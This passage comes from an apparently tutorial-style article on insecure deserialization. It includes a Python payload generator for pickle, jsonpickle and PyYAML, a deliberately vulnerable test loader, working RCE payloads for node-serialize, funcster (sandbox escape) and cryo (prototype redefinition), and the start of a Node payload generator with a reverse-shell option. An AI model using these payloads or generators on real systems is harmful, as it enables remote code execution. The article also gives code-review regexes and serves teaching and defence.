        <span class="s">&quot;yaml&quot;</span><span class="p">:</span> <span class="s">&quot;Format for PyYAML module&quot;</span>
        <span class="p">}</span>
    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">available_formats</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;    {k}: {v}&quot;</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
        <span class="n">description</span><span class="o">=</span><span class="s">&#39;deser-py - A simple serialization payload generator&#39;</span><span class="p">,</span> <span class="n">add_help</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
        <span class="s">&#39;-d&#39;</span><span class="p">,</span> <span class="s">&#39;--debug&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">&#39;store_true&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span>
        <span class="n">help</span><span class="o">=</span><span class="s">&#39;Enable debug messages&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
        <span class="s">&#39;-s&#39;</span><span class="p">,</span> <span class="s">&#39;--save&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">&#39;store_true&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span>
        <span class="n">help</span><span class="o">=</span><span class="s">&#39;Save payload to file&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
        <span class="s">&#39;-v&#39;</span><span class="p">,</span> <span class="s">&#39;--vector&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">choices</span><span class="o">=</span><span class="p">[</span><span class="s">&quot;os&quot;</span><span class="p">,</span> <span class="s">&quot;subprocess&quot;</span><span class="p">],</span> <span class="n">default</span><span class="o">=</span><span class="s">&quot;os&quot;</span><span class="p">,</span>
        <span class="n">help</span><span class="o">=</span><span class="s">&#39;Save payload to file&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
        <span class="s">&#39;-f&#39;</span><span class="p">,</span> <span class="s">&#39;--format&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">choices</span><span class="o">=</span><span class="p">[</span><span class="s">&quot;pickle&quot;</span><span class="p">,</span> <span class="s">&quot;json&quot;</span><span class="p">,</span> <span class="s">&quot;yaml&quot;</span><span class="p">,</span> <span class="s">&quot;#&quot;</span><span class="p">],</span> <span class="n">default</span><span class="o">=</span><span class="s">&quot;#&quot;</span><span class="p">,</span>
        <span class="n">help</span><span class="o">=</span><span class="s">&#39;Serialization archive format&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
        <span class="s">&#39;-c&#39;</span><span class="p">,</span> <span class="s">&#39;--command&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;Command for the payload&#39;</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">format</span> <span class="o">==</span> <span class="s">&quot;#&quot;</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;[*] The following format are accepted:&quot;</span><span class="p">)</span>
        <span class="n">print_available_formats</span><span class="p">()</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">command</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;[-] A command (-c) is required to generate the payload&quot;</span><span class="p">)</span>
    <span class="n">command</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">command</span>

    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;[+] Generating serialized object for:&quot;</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;    {command}&quot;</span><span class="p">)</span>
    <span class="n">cls</span> <span class="o">=</span> <span class="n">Payload</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">vector</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">format</span> <span class="o">==</span> <span class="s">&quot;pickle&quot;</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">save</span><span class="p">:</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.bin&quot;</span><span class="p">,</span> <span class="s">&quot;wb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
                <span class="n">payload</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">_pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">cls</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;[+] Final Payload:</span><span class="se">\n</span><span class="s">    {_pickle.dumps(cls)}&quot;</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">format</span> <span class="o">==</span> <span class="s">&quot;json&quot;</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">save</span><span class="p">:</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.json&quot;</span><span class="p">,</span> <span class="s">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
                <span class="n">payload</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">jsonpickle</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">cls</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;[+] Final Payload:</span><span class="se">\n</span><span class="s">    {jsonpickle.encode(cls)}&quot;</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">format</span> <span class="o">==</span> <span class="s">&quot;yaml&quot;</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">save</span><span class="p">:</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.yml&quot;</span><span class="p">,</span> <span class="s">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
                <span class="n">yaml</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">cls</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">cls</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">,</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">    &#39;</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;[+] Final Payload:</span><span class="se">\n</span><span class="s">    {p}&quot;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</pre></div>

<p>The functions provided by this simple tool can be inspected using the help:</p>
<div class="codehilite"><pre><span class="nv">$ </span>python PayloadGenerator.py -h
usage: PayloadGenerator.py <span class="o">[</span>-h<span class="o">]</span> <span class="o">[</span>-d<span class="o">]</span> <span class="o">[</span>-s<span class="o">]</span> <span class="o">[</span>-v <span class="o">{</span>os,subprocess<span class="o">}]</span> -f <span class="o">{</span>pickle,json,yaml,#<span class="o">}</span> <span class="o">[</span>-c COMMAND<span class="o">]</span>

PayloadGenerator - A simple serialization payload generator

optional arguments:
  -h, --help            show this <span class="nb">help </span>message and <span class="nb">exit</span>
  -d, --debug           Enable debug messages
  -s, --save            Save payload to file
  -v <span class="o">{</span>os,subprocess<span class="o">}</span>, --vector <span class="o">{</span>os,subprocess<span class="o">}</span>
                        Save payload to file
  -f <span class="o">{</span>pickle,json,yaml,#<span class="o">}</span>, --format <span class="o">{</span>pickle,json,yaml,#<span class="o">}</span>
                        Serialization archive format
  -c COMMAND, --command COMMAND
                        Command <span class="k">for</span> the payload
</pre></div>

<p>To test our payloads, and for simplicity, we&rsquo;ll use the following vulnerable code:</p>
<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">_pickle</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">yaml</span>
<span class="kn">import</span> <span class="nn">jsonpickle</span>

<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">&quot;b&quot;</span><span class="p">:</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.bin&quot;</span><span class="p">,</span> <span class="s">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
        <span class="n">_pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">&quot;y&quot;</span><span class="p">:</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.yml&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
        <span class="k">if</span> <span class="nb">float</span><span class="p">(</span><span class="n">yaml</span><span class="o">.</span><span class="n">__version__</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mf">5.1</span><span class="p">:</span> 
            <span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">yaml</span><span class="o">.</span><span class="n">unsafe_load</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">&quot;j&quot;</span><span class="p">:</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.json&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
        <span class="n">jsonpickle</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</pre></div>

<p>To generate a valid payload for jsonpickle, for example, we can use the script with the following arguments:</p>
<div class="codehilite"><pre><span class="nv">$ </span>python PayloadGenerator.py -f json -v os -c <span class="s2">&quot;cmd /c calc&quot;</span>
<span class="o">[</span>+<span class="o">]</span> Generating serialized object <span class="k">for</span>:
    cmd /c calc
<span class="o">[</span>+<span class="o">]</span> Final Payload:
    <span class="o">{</span><span class="s2">&quot;py/reduce&quot;</span>: <span class="o">[{</span><span class="s2">&quot;py/function&quot;</span>: <span class="s2">&quot;nt.system&quot;</span><span class="o">}</span>, <span class="o">{</span><span class="s2">&quot;py/tuple&quot;</span>: <span class="o">[</span><span class="s2">&quot;cmd /c calc&quot;</span><span class="o">]}]}</span>
</pre></div>

<p><strong>Tips for Source Code reviewers</strong></p>
<p>To find this kind of vulnerability it is usually a good start to search the code for common regexes, like: </p>
<ul>
<li><code>(loads|load|unsafe_load|decode)\s*\(</code></li>
<li><code>([p|P]ickle|yaml)</code></li>
</ul>
<p>For each match, the code should be manually inspected to see whether the object being deserialized can be manipulated by an external attacker.</p>
<h4 id="references_3">References<a class="headerlink" href="#references_3" title="Permanent link"></a></h4>
<ul>
<li><a href="https://www.exploit-db.com/docs/47655">PyYAML - Exploit-DB</a></li>
<li><a href="https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/">Exploiting jsonpickle</a></li>
</ul>
<h3 id="nodejs">NodeJS<a class="headerlink" href="#nodejs" title="Permanent link"></a></h3>
<p>In NodeJS, serialization is handled by many different modules, which allow to marshal arbitrary complex objects in JSON-like format. We&rsquo;ll se a few of them, which were found to be susceptible to deserialization issues:</p>
<ul>
<li>node-serialize</li>
<li>serialize-to-js</li>
<li>funcster</li>
</ul>
<p>Before starting digging into the vulnerabilities, it should be clear to the reader that this kind of issues in JavaScript behave way differently in comparison to previous examples. No POP gadget chain is required to trigger RCE or sort of. Why so? Well, usually, bug of this type in JavaScript implies the serialized payload to be passed to functions like <code>eval()</code>, or <code>new Function()</code>, which implies that arbitrary code may be executed by the application.</p>
<p><strong>node-serialize</strong></p>
<p>The first NodeJS module we&rsquo;ll analyse is <code>node-serialize</code>. In 2017, a researcher named <strong>Ajin Abraham</strong> found that this module allowed deserialization of function objects in a non-safe way, leading to RCE. </p>
<p>If you test it, you&rsquo;ll find out that <code>node-serialize</code> serializes objects using regular JSON format. The question that may arise is, why not JSON.stringify(), then? The reason being that JSON cannot really serialize functions.</p>
<p>For this reason, if an object containing a functional literal is serialized with <code>JSON.stringify</code>, the literal would be lost:</p>
<div class="codehilite"><pre><span class="nx">node</span> <span class="o">-</span><span class="nx">e</span> <span class="s2">&quot;console.log(JSON.stringify({&#39;a&#39;:function(){console.log(&#39;HELLO!&#39;);}}));&quot;</span>

<span class="p">{}</span>
</pre></div>

<p>While if serialized with <code>node-serialize</code>, the result would be the following:</p>
<div class="codehilite"><pre><span class="nx">$</span> <span class="nx">node</span> <span class="o">-</span><span class="nx">e</span> <span class="s2">&quot;console.log(require(&#39;node-serialize&#39;).serialize({&#39;a&#39;:function(){console.log(&#39;HELLO!&#39;);}}));&quot;</span>

<span class="p">{</span><span class="s2">&quot;a&quot;</span><span class="o">:</span><span class="s2">&quot;_$$ND_FUNC$$_function(){console.log(&#39;HELLO!&#39;);}&quot;</span><span class="p">}</span>
</pre></div>

<p>The problem arises, of course, during the deserialization process, because to reverse the function back, <code>node-serialize</code> would pass any object prefixed with <code>_$$ND_FUNC$$_</code> to <code>eval</code>, as can be seen from the following snippet:</p>
<div class="codehilite"><pre><span class="c1">// https://github.com/luin/serialize/blob/master/lib/serialize.js</span>
<span class="mi">75</span><span class="p">.</span> <span class="k">if</span><span class="p">(</span><span class="nx">obj</span><span class="p">[</span><span class="nx">key</span><span class="p">].</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">FUNCFLAG</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">76</span><span class="p">.</span>     <span class="nx">obj</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;(&#39;</span> <span class="o">+</span> <span class="nx">obj</span><span class="p">[</span><span class="nx">key</span><span class="p">].</span><span class="nx">substring</span><span class="p">(</span><span class="nx">FUNCFLAG</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;)&#39;</span><span class="p">);</span>
<span class="mi">77</span><span class="p">.</span> <span class="p">}</span>
</pre></div>

<p>So if we serialize an object like this:</p>
<div class="codehilite"><pre><span class="p">{</span><span class="s2">&quot;rce&quot;</span><span class="o">:</span><span class="s2">&quot;_$$ND_FUNC$$_function() { CMD = \&quot;cmd /c calc\&quot;; require(&#39;child_process&#39;).exec(CMD, function(error, stdout, stderr) { console.log(stdout) }); }()&quot;</span><span class="p">}</span>
</pre></div>

<p>We would achieve remote code execution on the target machine (in this case, spawn a calculator on a Windows box).</p>
<p><strong>funcster</strong></p>
<p>The <code>funcster</code> module is also affected by a deserialization vulnerability. However, this time, the vulnerability is triggered via <code>module.exports</code> and executed within a sandboxed environment:</p>
<div class="codehilite"><pre><span class="c1">// https://github.com/jeffomatic/funcster/blob/master/js/lib/funcster.js</span>
<span class="mi">83</span><span class="p">.</span> <span class="nx">_generateModuleScript</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">serializedFunctions</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">84</span><span class="p">.</span>      <span class="kd">var</span> <span class="nx">body</span><span class="p">,</span> <span class="nx">entries</span><span class="p">,</span> <span class="nx">name</span><span class="p">;</span>
<span class="mi">85</span><span class="p">.</span>      <span class="nx">entries</span> <span class="o">=</span> <span class="p">[];</span>
<span class="mi">86</span><span class="p">.</span>      <span class="k">for</span> <span class="p">(</span><span class="nx">name</span> <span class="k">in</span> <span class="nx">serializedFunctions</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">87</span><span class="p">.</span>        <span class="nx">body</span> <span class="o">=</span> <span class="nx">serializedFunctions</span><span class="p">[</span><span class="nx">name</span><span class="p">];</span>
<span class="mi">88</span><span class="p">.</span>        <span class="nx">entries</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s2">&quot;&quot;</span> <span class="o">+</span> <span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">name</span><span class="p">))</span> <span class="o">+</span> <span class="s2">&quot;: &quot;</span> <span class="o">+</span> <span class="nx">body</span><span class="p">);</span>
<span class="mi">89</span><span class="p">.</span>      <span class="p">}</span>
<span class="mi">90</span><span class="p">.</span>      <span class="nx">entries</span> <span class="o">=</span> <span class="nx">entries</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">);</span>
<span class="mi">91</span><span class="p">.</span>      <span class="k">return</span> <span class="s2">&quot;module.exports=(function(module,exports){return{&quot;</span> <span class="o">+</span> <span class="nx">entries</span> <span class="o">+</span> <span class="s2">&quot;};})();&quot;</span><span class="p">;</span>
<span class="mi">92</span><span class="p">.</span>    <span class="p">},</span>
<span class="p">...</span>
<span class="mi">141</span><span class="p">.</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createScript</span><span class="p">(</span><span class="nx">script</span><span class="p">,</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">filename</span><span class="p">).</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
<span class="mi">142</span><span class="p">.</span> <span class="k">return</span> <span class="nx">sandbox</span><span class="p">.</span><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="p">;</span>
</pre></div>

<p>For this reason, we cannot directly call function as <code>require()</code>. However, we can still exploit it via sandbox bypassing. The common technique to achieve that is to access global objects via <code>this.constructor.costructor</code>. This payload can be used to achieve RCE on an application using <code>require('funcster').unserialize()</code>:</p>
<div class="codehilite"><pre><span class="p">{</span><span class="s2">&quot;rce&quot;</span><span class="o">:</span><span class="p">{</span><span class="s2">&quot;__js_function&quot;</span><span class="o">:</span><span class="s2">&quot;function(){CMD=\&quot;cmd /c calc\&quot;;const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;).exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()&quot;</span><span class="p">}}</span>
</pre></div>

<p><strong>cryo</strong></p>
<p>The last module we&rsquo;ll see is <code>cryo</code>. This library, as explicitly stated on the module website, extends the JSON functionalities offering complex object and function serialization.</p>
<p>This library is not directly vulnerable to RCE via deserialization, because it properly handles function and complex objects. However, it allows for object prototypes redefinition. As you may know, any object in JavaScript holds is own properties and methods. Usually, it&rsquo;s not possible to add properties to an existing object constructor, however, JavaScript prototype allows to add/redefine properties or methods at runtime, without adding them via the default constructor. Additionally, we can access the <code>Object.prototype</code> property using the <code>__proto__</code> property.</p>
<p>The <code>__proto__</code> property of Object.prototype is an accessor property (a getter function and a setter function) that exposes the internal <a class="wikilink" href="/Prototype/">Prototype</a> (either an object or null) of the object through which it is accessed.</p>
<p>If we manipulate the <code>__proto__</code> property, then, we could be able to overwrite/redefine standard methods of the object we want to deserialize, such as <code>toString()</code> or <code>valueOf()</code>. So, what would happen if we try to deserialize the following JSON payload?</p>
<div class="codehilite"><pre><span class="p">{</span>
    <span class="s2">&quot;root&quot;</span><span class="o">:</span><span class="s2">&quot;_CRYO_REF_2&quot;</span><span class="p">,</span>
    <span class="s2">&quot;references&quot;</span><span class="o">:</span><span class="p">[{</span>
        <span class="s2">&quot;contents&quot;</span><span class="o">:</span><span class="p">{},</span>
        <span class="s2">&quot;value&quot;</span><span class="o">:</span><span class="s2">&quot;_CRYO_FUNCTION_function(){ CMD = \&quot;cmd /c calc\&quot;; const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;).exec(CMD, function(error, stdout, stderr) { console.log(stdout) });}()&quot;</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="s2">&quot;contents&quot;</span><span class="o">:</span><span class="p">{</span><span class="s2">&quot;toString&quot;</span><span class="o">:</span><span class="s2">&quot;_CRYO_REF_0&quot;</span><span class="p">},</span>
        <span class="s2">&quot;value&quot;</span><span class="o">:</span><span class="s2">&quot;_CRYO_OBJECT_&quot;</span> <span class="p">},</span>
    <span class="p">{</span>
        <span class="s2">&quot;contents&quot;</span><span class="o">:</span><span class="p">{</span><span class="s2">&quot;__proto__&quot;</span><span class="o">:</span><span class="s2">&quot;_CRYO_REF_1&quot;</span><span class="p">},</span>
        <span class="s2">&quot;value&quot;</span><span class="o">:</span><span class="s2">&quot;_CRYO_OBJECT_&quot;</span>        
    <span class="p">}]</span>
<span class="p">}</span>
</pre></div>

<p>During deserialization, cryo would redefine the <code>toString()</code> function, via <code>__proto__</code> accessor. If later on the application try calling the <code>toString()</code> method of the deserialized object, the RCE function would be called instead.
Of course, we can redefine whatever object method we like, <code>toString</code> is just an example.</p>
<h4 id="generate-payloads-dynamically">Generate payloads dynamically<a class="headerlink" href="#generate-payloads-dynamically" title="Permanent link"></a></h4>
<p>As we&rsquo;ve seen how the process works, it&rsquo;s time to create our payloads. I order to do that, the following script, named <strong>desert-node</strong>, can be used to generate different payloads for the libraries we&rsquo;ve just seen. The tool can be also downloaded <a href="https://github.com/klezVirus/deser-node">here</a>.</p>
<div class="codehilite"><pre><span class="cm">/**</span>
<span class="cm">* This script provides a simple cli to generate payloads for:</span>
<span class="cm">* - node-serialize</span>
<span class="cm">* - funcster</span>
<span class="cm">* - cryo</span>
<span class="cm">*</span>
<span class="cm">* It&#39;s not meant to be a complete tool, but just a proof of concept</span>
<span class="cm">**/</span>
<span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>

<span class="kd">var</span> <span class="nx">argv</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;yargs&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">usage</span><span class="p">(</span><span class="s1">&#39;Usage: $0 -f [file] [options]&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;f&#39;</span><span class="p">,</span> <span class="s1">&#39;file&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">,</span> <span class="s1">&#39;mode&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="s1">&#39;serializer&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;v&#39;</span><span class="p">,</span> <span class="s1">&#39;vector&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="s1">&#39;command&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;H&#39;</span><span class="p">,</span> <span class="s1">&#39;lhost&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;P&#39;</span><span class="p">,</span> <span class="s1">&#39;lport&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;t&#39;</span><span class="p">,</span> <span class="s1">&#39;target&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;p&#39;</span><span class="p">,</span> <span class="s1">&#39;cryoprototype&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">alias</span><span class="p">(</span><span class="s1">&#39;h&#39;</span><span class="p">,</span> <span class="s1">&#39;help&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">choices</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="p">[,</span> <span class="s1">&#39;ns&#39;</span><span class="p">,</span> <span class="s1">&#39;fstr&#39;</span><span class="p">,</span> <span class="s1">&#39;cryo&#39;</span><span class="p">])</span>
    <span class="p">.</span><span class="nx">choices</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;serialize&#39;</span><span class="p">,</span> <span class="s1">&#39;deserialize&#39;</span><span class="p">])</span>
    <span class="p">.</span><span class="nx">choices</span><span class="p">(</span><span class="s1">&#39;v&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;rce&#39;</span><span class="p">,</span> <span class="s1">&#39;rshell&#39;</span><span class="p">])</span>
    <span class="p">.</span><span class="nx">choices</span><span class="p">(</span><span class="s1">&#39;t&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="s1">&#39;windows&#39;</span><span class="p">])</span>
    <span class="p">.</span><span class="k">default</span><span class="p">(</span><span class="s1">&#39;t&#39;</span><span class="p">,</span> <span class="s1">&#39;windows&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="k">default</span><span class="p">(</span><span class="s1">&#39;p&#39;</span><span class="p">,</span> <span class="s1">&#39;toString&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="k">default</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="s1">&#39;ns&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="k">default</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">,</span> <span class="s1">&#39;serialize&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;f&#39;</span><span class="p">,</span><span class="s1">&#39;Input file&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">,</span><span class="s1">&#39;Operational mode, may be serialize or deserialize&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;The serializer module to use&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;v&#39;</span><span class="p">,</span><span class="s1">&#39;The vector is command exe or reverse shell&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;The command to execute (-v rce must be used)&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;e&#39;</span><span class="p">,</span><span class="s1">&#39;Charencode the payload (not implemented yet)&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;H&#39;</span><span class="p">,</span><span class="s1">&#39;Local listener IP (-v rshell must be used)&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;P&#39;</span><span class="p">,</span><span class="s1">&#39;Local listener PORT (-v rshell must be used)&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;t&#39;</span><span class="p">,</span><span class="s1">&#39;Target machine OS, may be Win or Linux&#39;</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">demandOption</span><span class="p">([</span><span class="s1">&#39;f&#39;</span><span class="p">])</span>
